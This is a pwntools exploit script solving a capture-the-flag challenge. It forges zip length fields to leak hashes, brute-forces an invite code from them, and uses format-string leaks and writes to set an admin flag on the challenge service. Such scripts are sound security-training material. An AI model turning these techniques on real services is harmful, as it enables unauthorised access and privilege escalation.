from pwn import *
#context.log_level = 'debug'
from zipfile import ZipFile 
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chal'
HOST = 'myfiles.chal.irisc.tf'
PORT =  10001

def start():
    if not args.R:
        print("local")
        return process(TARGET)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

from binascii import hexlify
def upload(uid, file):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'? ', str(uid).encode())
    r.sendlineafter(b'file\n', hexlify(file))

def list_file(uid=15):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'? ', str(uid).encode())

def create_user(code, name, pw):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'? ', code)
    r.sendlineafter(b'? ', name)
    r.sendlineafter(b'? ', pw)

def view_file(uid, pw, cid): 
    r.sendlineafter(b'> ', b'5')
    r.sendlineafter(b'? ', str(uid).encode())
    r.sendlineafter(b'? ', pw)
    r.sendlineafter(b'? ', str(cid).encode())

def view_flag(uid, pw): 
    r.sendlineafter(b'> ', b'6')
    r.sendlineafter(b'? ', str(uid).encode())
    r.sendlineafter(b'? ', pw)

def dohash(inp, leng=10):
    out = 0xCBF29CE484222325
    for i in range(leng):
        out = 0x100000001B3 * (inp[i] ^ out)
        out &= 0xffffffffffffffff
    return out

# create base zip file
with ZipFile('exp.zip', 'w') as myzip:
    with myzip.open('a'*0x20, 'w') as myfile:
        myfile.write(b'b'*0xf)

r = start()
if args.D:
    #debug(r, [0x23b7]) # fsb
    debug(r, [0x17c8]) # length check -- call hash

with open('./exp.zip', 'rb') as f:
    inp = f.read()

# generate hash with invitecode
contlen_offset = 0x12
namelen_offset = 0x12+0x8
contlen = 0xa

# change name_length offset and generate hash 20times
for i in range(20):
    namelen = 0x100000000-(0x1e4-1) - i*5 - (512*i)
    if not args.R:
        namelen = 0x100000000-0x1e4 - i*5 - (512*i)
    forge = inp[:contlen_offset] + p32(contlen) + inp[contlen_offset+4:namelen_offset]+p32(namelen)+inp[namelen_offset+4:0x1ff]
    upload(15, forge)

# gather all hashes
list_file()
hashes = []
for i in range(20):
    r.recvuntil(b'  10 ')
    hashes.append(int(r.recvuntil(b'\n', True), 16))

# bruteforce with small wordbag
invite_code = b''
wordbag = '-abcdefghijklmnopqrstuvwxyz'
seed = b'PK\x01\x02\x3f\x00\x0a\x00\x00'
while len(invite_code) < 20:
    for w in wordbag:
        if hashes[len(invite_code)] == dohash((w.encode()+invite_code+seed)[:10]):
            invite_code = w.encode() + invite_code
            break
print(f'found invitecode: {invite_code}')
if not args.R:
    invite_code = b'terrible-red-busses'

# use fsb to overwrite admin flag
user = b'aaaa'
pw = b'bbbb'
create_user(invite_code, user, pw)

with ZipFile('exp.zip', 'w') as myzip:
    with myzip.open('aa', 'w') as myfile:
        myfile.write(b'|%8$p|@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@')

with open('./exp.zip', 'rb') as f:
    inp = f.read()

upload(0, inp)
view_file(0, pw, 0)
r.recvuntil(b'|')
leak = int(r.recvuntil(b'|', True), 16)
print(f'{leak = :#x}')

with ZipFile('exp.zip', 'w') as myzip:
    with myzip.open('aa', 'w') as myfile:
        myfile.write(b'%c%16$hhnaaaaaaa'+p64(leak+0x10))

with open('./exp.zip', 'rb') as f:
    inp = f.read()
upload(0, inp)
view_file(0, pw, 1)
view_flag(0, pw)

r.interactive()
r.close()

